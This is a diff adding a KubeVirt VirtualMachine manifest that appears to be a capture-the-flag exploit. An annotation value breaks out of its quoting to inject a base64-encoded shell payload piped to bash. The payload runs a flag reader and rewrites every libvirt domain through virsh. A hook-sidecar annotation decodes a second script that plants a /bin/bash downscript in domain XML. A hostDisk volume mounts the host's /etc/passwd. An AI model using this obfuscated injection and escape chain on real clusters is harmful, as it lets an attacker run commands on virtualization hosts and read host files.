@@ -1,0 +1,41 @@
+apiVersion: kubevirt.io/v1
+kind: VirtualMachine
+metadata:
+  name: test
+spec:
+  running: true
+  template:
+    metadata:
+      annotations:
+        kubevirt.io/libvirt-log-filters: "2:qemu.qemu_monitor 3:*\"\na=\"$(echo 'L3J1bi9rdWJldmlydC1wcml2YXRlL3ZtaS1kaXNrcy90ZXN0L3JlYWRmbGFnID4gL3RtcC9mbGFnLnR4dApub2h1cCBiYXNoIC1jICcKdigpIHsKICAgIHZpcnNoIC1jIHFlbXUrdW5peDovLy9zZXNzaW9uP3NvY2tldD0vdmFyL3J1bi9saWJ2aXJ0L3ZpcnRxZW11ZC1zb2NrICIkQCIKfQoKZm9yIHZtIGluICQodiBsaXN0IC0tYWxsIC0tbmFtZSk7IGRvCiAgICB2IGR1bXB4bWwgJHZtID4gL3RtcC9hLnhtbAogICAgaWYgWyAtcyAvdG1wL2EueG1sIF07IHRoZW4KICAgICAgICBzZWQgLWkgL3RtcC9hLnhtbCBcCiAgICAgICAgICAgIC1lICJzfC92YXIvcnVuL2xpYnZpcnQvdmlydHFlbXVkLmNvbmZ8dGFwMHxnIiBcCiAgICAgICAgICAgIC1lICJzfC9iaW4vYmFzaHx8ZyIgXAogICAgICAgICAgICAtZSAic3wtc2VyaWFsMTIzfC1zZXJpYWwwfGciIFwKICAgICAgICAgICAgLWUgInN8L3Zhci8uKnBhc3N3ZHwvdG1wL2ZsYWcudHh0fGciCiAgICAgICAgdiBkZWZpbmUgL3RtcC9hLnhtbAogICAgZmkKZG9uZQonICY+PiAvdG1wLzMudHh0ICY=' | base64 -d | bash)"
+        hooks.kubevirt.io/hookSidecars: |
+          [{"command": ["/bin/bash"], "args": ["-c", "echo 'IyEvYmluL2Jhc2gKCnRlbXBGaWxlPWAvYmluL21rdGVtcCAtLWRyeS1ydW5gCmVjaG8gJDQgPiAkdGVtcEZpbGUKaWYgWyAhIC1mICIvdG1wL2FhYWEiIF07IHRoZW4KICBlY2hvIDAgPiAvdG1wL2FhYWEKZmkKL2Jpbi9zZWQgLWkgJHRlbXBGaWxlIC1lICJzfHRhcDB8L3Zhci9ydW4vbGlidmlydC92aXJ0cWVtdWQuY29uZnxnIgovYmluL3NlZCAtaSAkdGVtcEZpbGUgLWUgInN8LXNlcmlhbDB8LXNlcmlhbDEyM3xnIgovYmluL3NlZCAtaSAkdGVtcEZpbGUgLWUgInN8PC9pbnRlcmZhY2U+fDxkb3duc2NyaXB0IHBhdGg9Jy9iaW4vYmFzaCcvPjwvaW50ZXJmYWNlPnxnIgovYmluL2NhdCAkdGVtcEZpbGUK' | base64 -d > /tmp/onDefineDomain && chmod +x /tmp/onDefineDomain && PATH=/tmp /sidecar-shim --version v1alpha2"]}]
+    spec:
+      domain:
+        devices:
+          disks:
+          - disk:
+              bus: virtio
+            name: containerdisk
+          - disk:
+              bus: virtio
+              readonly: true
+            name: test
+          - name: cloudinitdisk
+            disk:
+              bus: virtio
+        resources:
+          requests:
+            memory: 64M
+      volumes:
+      - containerDisk:
+          image: quay.io/kubevirt/cirros-container-disk-demo
+        name: containerdisk
+      - hostDisk:
+          capacity: "0"
+          path: /etc/passwd
+          type: Disk
+        name: test
+      - name: cloudinitdisk
+        cloudInitNoCloud:
+          userDataBase64: SGkuXG4=
